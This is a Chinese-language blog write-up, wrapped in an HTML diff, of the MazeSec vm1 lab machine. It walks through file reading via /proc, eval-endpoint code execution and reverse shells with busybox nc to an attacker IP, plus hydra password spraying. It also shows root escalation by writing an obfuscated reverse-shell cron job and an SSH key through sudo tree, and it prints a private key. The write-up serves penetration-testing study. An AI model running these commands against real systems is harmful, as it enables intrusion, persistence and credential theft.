@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec vm1</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec vm1</h1>
+    <p>
+        <span class="meta">发布于: 2025-11-20 21:18</span>
+    </p>
+    <div class="post-body">
+        <blockquote>
+<p>靶机提示：flag 是用户的 ssh 密码</p>
+</blockquote>
+<h2>存活主机发现</h2>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/mazesec/vm1]
+└─$ sudo arp-scan -I eth2 192.168.6.0/24
+
+192.168.6.153   08:00:27:5d:72:53       PCS Systemtechnik GmbH</code></pre>
+<p>目标 IP：192.168.6.153</p>
+<h2>TCP 全端口扫描</h2>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/mazesec/vm1]
+└─$ nmap -p- -sT 192.168.6.153          
+
+PORT     STATE SERVICE
+80/tcp   open  http
+222/tcp  open  rsh-spx
+9000/tcp open  cslistener</code></pre>
+<p>nc 上去可以知道 222端口是 ssh 服务</p>
+<p><img src="/images/maze-vm1/29.png" alt="" /></p>
+<h2>80 端口服务探测</h2>
+<p>常规目录扫描（如 dirsearch）未发现敏感路径</p>
+<h2>9000 端口服务探测</h2>
+<p>访问 9000 端口</p>
+<p><img src="/images/maze-vm1/1.png" alt="" /></p>
+<p>注释里发现关键信息</p>
+<p><img src="/images/maze-vm1/2.png" alt="" /></p>
+<p>可以读取文件</p>
+<p><img src="/images/maze-vm1/3.png" alt="" /></p>
+<h2>敏感文件读取</h2>
+<p>读取 /etc/passwd，有php、python、node 用户</p>
+<pre><code class="language-bash">{
+    "content": "root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nphp:x:1000:1000:users:/home/php:/bin/sh\npython:x:1001:1001:users:/home/python:/bin/sh\nnode:x:1002:1002:users:/home/node:/bin/sh\n",
+    "filename": "/etc/passwd"
+}</code></pre>
+<p>根目录有 .dockerenv，当前环境为 docker容器</p>
+<p><img src="/images/maze-vm1/4.png" alt="" /></p>
+<h2>进程信息读取</h2>
+<p>尝试读取常规目录、文件，无果，无法读取到当前服务的源码</p>
+<blockquote>
+<p>/proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息</p>
+</blockquote>
+<p>尝试通过 虚拟文件系统 proc 读取进程信息， burp intrude 爆破进程 PID，读取进程id 1-50，通过响应包大小来判断哪些PID是有效的</p>
+<p><img src="/images/maze-vm1/5.png" alt="" /></p>
+<p>可以看到进程id 1、19、21、24、25、26、27、28、29 的 status返回长度不同，读取到了进程相关的文件内容 </p>
+<pre><code class="language-plaintext">/proc/1/status
+/proc/19/status
+/proc/21/status
+/proc/24/status
+/proc/25/status
+/proc/26/status
+/proc/27/status
+/proc/28/status
+/proc/29/status</code></pre>
+<p><img src="/images/maze-vm1/6.png" alt="" /></p>
+<p>爆破这几个进程的 /proc/$pid/cmdline 文件，读取进程的启动命令，如果有相对路径，就可以尝试读取对应的文件</p>
+<p><img src="/images/maze-vm1/7.png" alt="" /></p>
+<p>读取到 python 进程的启动命令，使用绝对命令启动了python脚本</p>
+<pre><code class="language-bash">/usr/bin/python3 /code/agent/pyagent.py</code></pre>
+<p><img src="/images/maze-vm1/8.png" alt="" /></p>
+<p>同样，可以读取其他进程的启动命令</p>
+<pre><code class="language-bash">python3 /code/agent/pyagent.py
+php -S 127.0.0.1:8080
+sh /code/start.sh
+python3 app.py
+node node.js</code></pre>
+<h2>源码文件读取</h2>
+<p>读取 /code/agent/pyagent.py 文件</p>
+<p><img src="/images/maze-vm1/9.png" alt="" /></p>
+<pre><code class="language-python">from flask import Flask, request, jsonify
+import os
+import sys
+from io import StringIO
+
+app = Flask(__name__)
+
+@app.route('/process', methods=['POST'])
+def process_action():
+    try:
+        data = request.get_json()
+    except:
+        return jsonify({'error': 'Invalid JSON input or missing "action" field.'}), 400
+
+    if not data or 'action' not in data:
+        return jsonify({'error': 'Invalid JSON input or missing "action" field.'}), 400
+
+    action = data['action']
+
+    if action == 'readfile':
+        if 'file' not in data:
+            return jsonify({'error': 'Missing "file" parameter for readfile action.'}), 400
+
+        filename = data['file']
+
+        try:
+            with open(filename, 'r') as f:
+                content = f.read()
+                return jsonify({
+                    "filename": filename,
+                    "content": content
+                })
+        except FileNotFoundError:
+            return jsonify({"error": f"File '{filename}' not found or not readable"}), 404
+        except Exception as e:
+            return jsonify({
+                "error": f"Error reading file: {str(e)}",
+                "type": type(e).__name__
+            }), 500
+
+    elif action == 'evalcode':
+        if 'code' not in data:
+            return jsonify({'error': 'Missing "code" parameter for evalcode action.'}), 400
+
+        code_to_eval = data['code']
+
+        old_stdout = sys.stdout
+        redirected_output = StringIO()
+        sys.stdout = redirected_output
+
+        result = None
+        error_type = None
+        error_message = None
+
+        try:
+            result = eval(code_to_eval)
+        except Exception as e:
+            error_type = type(e).__name__
+            error_message = str(e)
+        finally:
+            sys.stdout = old_stdout
+
+        captured_output = redirected_output.getvalue()
+
+        if error_type:
+            return jsonify({
+                "error": f"Code execution error ({error_type}): {error_message}",
+                "type": error_type
+            }), 500
+
+        return jsonify({
+            "code": code_to_eval,
+            "result": str(result),
+            "output": captured_output,
+            "type": str(type(result).__name__)
+        })
+
+    else:
+        return jsonify({'error': 'Unknown action. Supported actions: readfile, evalcode.'}), 400
+
+if __name__ == '__main__':
+    app.run(debug=True, host='127.0.0.1', port=5000)</code></pre>
+<p>json 键名使用 evalcode，可以执行任意 python 代码</p>
+<h2>python 代码执行</h2>
+<p>反弹shell，反弹 bash 断开连接，因为 容器是 alpine 镜像，默认shell是 /bin/sh（Ash），而不是 bash，可以选择 /bin/sh 反弹shell</p>
+<pre><code class="language-python">{"action": "evalcode","code": "__import__('os').popen('busybox nc 192.168.6.101 4444 -e /bin/sh')"}</code></pre>
+<p>报错，但是弹上了已经</p>
+<p><img src="/images/maze-vm1/10.png" alt="" /></p>
+<p><img src="/images/maze-vm1/11.png" alt="" /></p>
+<p>靶机没有bash</p>
+<p><img src="/images/maze-vm1/12.png" alt="" /></p>
+<p>根目录存在 flag_node、flag_php、flag_py 三个 flag 文件，只能对应的三个用户读取</p>
+<p><img src="/images/maze-vm1/14.png" alt="" /></p>
+<p>可以读取到 php 源码，nodejs 源码</p>
+<p><img src="/images/maze-vm1/13.png" alt="" /></p>
+<p>index.php 功能与 pyagent.py 一致，仅展示关键部分</p>
+<pre><code class="language-php">if ($action === 'evalcode') {
+    if (!isset($data['code'])) {
+        http_response_code(400);
+        echo json_encode(['error' =&gt; 'Missing "code" parameter for evalcode action.']);
+        exit;
+    }
+    $code_to_eval = $data['code'];
+    ob_start();
+    try {
+        $result = eval("return " . $code_to_eval . ";");
+        $output = ob_get_clean();
+        echo json_encode([
+            "code" =&gt; $code_to_eval,
+            "result" =&gt; $result,
+            "output" =&gt; $output,
+            "type" =&gt; gettype($result)
+        ]);
+
+    }
+}</code></pre>
+<p>nodejs 代码同样类似</p>
+<pre><code class="language-javascript">const port = 3000;
+app.post('/evalcode', (req, res) =&gt; {
+    const codeToEval = req.body.code;
+    let result;
+    let type;
+    result = eval(codeToEval);
+    type = typeof result;
+
+    res.json({
+        code: codeToEval,
+        result: String(result),
+        type: type
+    });
+});</code></pre>
+<h2>flag 获取</h2>
+<h3>python flag 获取</h3>
+<p>当前已经拿到了 python 用户的反弹shell，读取 /flag_python 文件</p>
+<p><img src="/images/maze-vm1/16.png" alt="" /></p>
+<blockquote>
+<p>flag_py： flag{flag1is_python</p>
+</blockquote>
+<h3>php flag 获取</h3>
+<p>回到 9000 端口前端，使用 php 代码反弹shell，拿到一个 php 用户的 shell</p>
+<pre><code class="language-python">{"action": "evalcode","code": "system('busybox nc 192.168.6.101 4445 -e /bin/sh')"}</code></pre>
+<p><img src="/images/maze-vm1/15.png" alt="" /></p>
+<blockquote>
+<p>flag_php： _flag2_isphp</p>
+</blockquote>
+<h3>node flag 获取</h3>
+<p>node 的 evalcode 接口监听在本地的 3000端口，容器环境过于极简，没有wget,curl 等请求工具，busybox有wget，用busybox wget传递post参数似乎有点问题，没有拿到返回内容</p>
+<p>拷打ai，写了一个 busybox nc 请求 3000 端口，在已有的 php、python 的 shell 里执行，直接读取flag_node 文件</p>
+<pre><code class="language-bash">JSON_PAYLOAD='{"code":"require(\"child_process\").execSync(\"cat /flag_node\").toString()"}'
+
+PAYLOAD_LEN=$(printf "%s" "$JSON_PAYLOAD" | wc -c)
+
+(
+    printf "POST /evalcode HTTP/1.1\r\n"
+    printf "Host: 127.0.0.1:3000\r\n"
+    printf "Content-Type: application/json\r\n"
+    printf "Content-Length: %s\r\n" "$PAYLOAD_LEN"
+    printf "Connection: close\r\n"
+    printf "\r\n"
+    printf "%s" "$JSON_PAYLOAD"
+) | busybox nc 127.0.0.1 3000</code></pre>
+<p><img src="/images/maze-vm1/17.png" alt="" /></p>
+<blockquote>
+<p>flag<em>node：have</em>@funnnnnnnngooos}</p>
+</blockquote>
+<p>拼凑出完整的flag：flag{flag1is_python_flag2<em>isphphave</em>@funnnnnnnngooos}</p>
+<p>根据提示，这是 ssh 密码，ssh 用户名未知，爆破用户名/密码喷洒</p>
+<h2>ssh 登录 admin 用户</h2>
+<p>hydra 爆破用户名/密码喷洒</p>
+<pre><code class="language-bash">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p "flag{flag1is_python_flag2_isphphave_@funnnnnnnngooos}" ssh://192.168.6.153:222 -t 20 -f -v -V</code></pre>
+<p>拿到用户名 admin</p>
+<p><img src="/images/maze-vm1/18.png" alt="" /></p>
+<h2>sudo 权限枚举</h2>
+<p>admin 用户有 sudo tree 权限</p>
+<p><img src="/images/maze-vm1/19.png" alt="" /></p>
+<h2>方法一：--fromfile 参数读取文件</h2>
+<p>tree 命令帮助参数里，--fromfile 选项，可以从文件里读取内容，以树状形式展示</p>
+<p><img src="/images/maze-vm1/20.png" alt="" /></p>
+<p>测试</p>
+<p><img src="/images/maze-vm1/21.png" alt="" /></p>
+<p><img src="/images/maze-vm1/22.png" alt="" /></p>
+<p>tree 的 --fromfile 选项可以读取任意文件内容，以树状形式展示，sudo tree 直接读取 root.txt</p>
+<p><img src="/images/maze-vm1/23.png" alt="" /></p>
+<h2>方法二：控制输出内容写入文件</h2>
+<p>使用上面的 --fromfile 参数可以做到读取文件内容</p>
+<pre><code class="language-bash">admin@debian:/home/xj/111$ tree --fromfile -i 2.txt
+2.txt
+1234567
+
+0 directories, 1 file</code></pre>
+<p>打印的内容格式如下</p>
+<pre><code class="language-plaintext">文件名
+文件内容
+
+目录/文件数量统计</code></pre>
+<p>通过 --noreport 参数，可以去掉目录/文件数量统计</p>
+<pre><code class="language-bash">admin@debian:/home/xj/111$ tree --noreport --fromfile -i 2.txt 
+2.txt
+1234567</code></pre>
+<p>第一行文件名还有点碍事，如果文件名开头是 <code>#</code> ，这样有些文件会把这个第一行的文件名当作注释忽略掉，写入的文件内容正常生效</p>
+<p>下面是想到的两种无损提权玩法</p>
+<h3>方案一：写入反弹shell定时任务</h3>
+<p>写入反弹shell的定时任务到 /etc/cron.d/rootRevShell 文件，注意严格控制内容不能出现 <code>/</code></p>
+<p>本地测试输出内容，测试正常</p>
+<pre><code class="language-bash">
+# /tmp/rootRevShell
+* * * * * root bash -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo= | base64 -d | bash"
+
+┌──(npc㉿kali)-[~/.ssh]
+└─$ cd /tmp
+
+┌──(npc㉿kali)-[~/.ssh]
+└─$ echo 'busybox nc 192.168.6.101 4444 -e bash'|base64                                                                              
+YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo=
+
+# 每分钟执行一次反弹shell命令
+┌──(npc㉿kali)-[~/.ssh]
+└─$ echo '* * * * * root bash -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo= | base64 -d | bash"' &gt; '#rootRevShell'
+
+# 使用 -N 避免tree转义文件名中的特殊字符，如果空格
+┌──(npc㉿kali)-[~/.ssh]
+└─$ tree --fromfile --noreport -i -N '#rootRevShell'
+#rootRevShell
+* * * * * root bash -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo= | base64 -d | bash"</code></pre>
+<p><img src="/images/maze-vm1/24.png" alt="" /></p>
+<p style="color:red">在本地与靶机测试 tree 命令时，发现存在差异，低版本会对空格等特殊字符进行转义，多出一个 \ ，会影响正常使用，所以使用 -N 选项禁用转义</p>
+<p>在靶机tmp再次测试，测试正常</p>
+<pre><code class="language-bash">admin@debian:/tmp$ echo '* * * * * root bash -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo= | base64 -d | bash"' &gt; '#rootRevShell'
+admin@debian:/tmp$ tree --fromfile --noreport -i -N '#rootRevShell'
+#rootRevShell
+* * * * * root bash -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo= | base64 -d | bash"
+admin@debian:/tmp$ </code></pre>
+<p><img src="/images/maze-vm1/25.png" alt="" /></p>
+<p>写入定时任务</p>
+<pre><code class="language-bash">admin@debian:/$ cd /tmp
+admin@debian:/tmp$ echo '* * * * * root bash -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo= | base64 -d | bash"' &gt; '#rootRevShell'
+admin@debian:/tmp$ tree --fromfile --noreport -i -N '#rootRevShell'
+#rootRevShell
+* * * * * root bash -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo= | base64 -d | bash"
+admin@debian:/tmp$ sudo /usr/bin/tree --fromfile --noreport -i -N '#rootRevShell' -o /etc/cron.d/rootRevShell</code></pre>
+<p>等待一分钟，拿到 root 反弹shell</p>
+<p><img src="/images/maze-vm1/26.png" alt="" /></p>
+<h3>方案二：写入公钥</h3>
+<blockquote>
+<p>该方法依赖 .ssh 目录存在且权限正确</p>
+</blockquote>
+<p>ssh 公钥允许存在 <code>#</code> 的注释行，所以也可以利用，关于文件内容不能出现 <code>/</code> 的限制，可以使用 ed25519 算法生成公钥对，公钥里出现 <code>/</code> 的概率较低</p>
+<p>给出一个公钥私钥对</p>
+<p>公钥</p>
+<pre><code class="language-plaintext">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ5pW4lZIWiSrKwJwdgyIsfCXWeCqglXPBYBHAqofV7w ssh-ed25519-20251121140715</code></pre>
+<p>私钥</p>
+<pre><code class="language-plaintext">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
+c2gtZWQyNTUxOQAAACCeaVuJWSFokqysCcHYMiLHwl1ngqoJVzwWARwKqH1e8AAA
+AKDEcu6CxHLuggAAAAtzc2gtZWQyNTUxOQAAACCeaVuJWSFokqysCcHYMiLHwl1n
+gqoJVzwWARwKqH1e8AAAAECsD7FLsWCmuBMvaO/DhQiajLDJ5ON+7nhn4V60tEi/
+aZ5pW4lZIWiSrKwJwdgyIsfCXWeCqglXPBYBHAqofV7wAAAAGnNzaC1lZDI1NTE5
+LTIwMjUxMTIxMTQwNzE1AQID
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+<p>因为这个靶机并不存在 .ssh 目录，可以通过上面定时任务拿到的root shell，模拟创建一个 .ssh 目录，并做好权限控制</p>
+<pre><code class="language-bash">cd /root
+mkdir -p .ssh
+chmod 700 .ssh</code></pre>
+<p>靶机写入公钥</p>
+<pre><code class="language-bash"># 写入ssh公钥authorized_keys
+admin@debian:/tmp$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ5pW4lZIWiSrKwJwdgyIsfCXWeCqglXPBYBHAqofV7w ssh-ed25519-20251121140715' &gt; '# sshKey'
+admin@debian:/tmp$ tree --fromfile --noreport -i -N '# sshKey'
+# sshKey
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ5pW4lZIWiSrKwJwdgyIsfCXWeCqglXPBYBHAqofV7w ssh-ed25519-20251121140715
+
+admin@debian:/tmp$ sudo /usr/bin/tree --fromfile --noreport -i -N '# sshKey' -o /root/.ssh/authorized_keys</code></pre>
+<p><img src="/images/maze-vm1/27.png" alt="" /></p>
+<p>本地创建私钥</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/.ssh]
+└─$ cat &gt; key &lt;&lt; 'EOF'
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
+c2gtZWQyNTUxOQAAACCeaVuJWSFokqysCcHYMiLHwl1ngqoJVzwWARwKqH1e8AAA
+AKDEcu6CxHLuggAAAAtzc2gtZWQyNTUxOQAAACCeaVuJWSFokqysCcHYMiLHwl1n
+gqoJVzwWARwKqH1e8AAAAECsD7FLsWCmuBMvaO/DhQiajLDJ5ON+7nhn4V60tEi/
+aZ5pW4lZIWiSrKwJwdgyIsfCXWeCqglXPBYBHAqofV7wAAAAGnNzaC1lZDI1NTE5
+LTIwMjUxMTIxMTQwNzE1AQID
+-----END OPENSSH PRIVATE KEY-----
+EOF
+
+┌──(npc㉿kali)-[~/.ssh]
+└─$ chmod 600 key
+
+┌──(npc㉿kali)-[~/.ssh]
+└─$ ssh root@192.168.6.153 -p 222 -i key</code></pre>
+<p>ssh 登录 root 成功</p>
+<p><img src="/images/maze-vm1/28.png" alt="" /></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>渗透</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#proc进程信息</span>
+                                    <span>#tree命令提权</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
